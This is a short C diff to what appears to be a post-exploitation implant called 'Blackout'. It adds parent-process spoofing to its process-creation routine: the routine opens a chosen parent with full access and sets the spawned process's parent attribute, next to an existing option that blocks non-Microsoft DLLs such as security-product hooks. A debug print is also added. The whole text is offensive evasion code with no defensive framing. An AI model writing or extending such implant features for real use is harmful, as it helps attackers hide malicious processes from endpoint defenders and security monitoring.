@@ -102,11 +102,12 @@ FUNC DWORD bkProcessCreate(
 
     UINT16 Count = 0;
 
-    PROCESS_INFORMATION Pi       = { 0 };
-    STARTUPINFOEXA      Si       = { 0 };
-    UINT64              AttrSize = 0;
-    PVOID               AttrBuff = NULL;
-    UINT64              Policy   = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+    PROCESS_INFORMATION Pi             = { 0 };
+    STARTUPINFOEXA      Si             = { 0 };
+    UINT64              AttrSize       = 0;
+    PVOID               AttrBuff       = NULL;
+    UINT64              Policy         = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+    HANDLE              hParentProcess = NULL;
 
     MmZero( &Pi, sizeof( PROCESS_INFORMATION ) );
     MmZero( &Si, sizeof( STARTUPINFOA ) );
@@ -127,8 +128,14 @@ FUNC DWORD bkProcessCreate(
     }
 
     if ( Blackout().Fork.Blockdlls ) Instance()->Win32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( UINT64 ), NULL, 0 );
-
+    if ( Blackout().Fork.Ppid      ) {
+        bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, Blackout().Fork.Ppid, &hParentProcess );
+        Instance()->Win32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof( HANDLE ), NULL, 0 );
+    }
+     
     if ( Blackout().Fork.Blockdlls || Blackout().Fork.Ppid || Blackout().Fork.Argue ) Si.lpAttributeList = AttrBuff;
+
+    BK_PRINT( "%d\n", Count );
 
     bCheck = Instance()->Win32.CreateProcessA( NULL, ProcCmd, NULL, NULL, InheritHandle, Flags, NULL, NULL, &Si.StartupInfo, &Pi );
     if ( !bCheck )
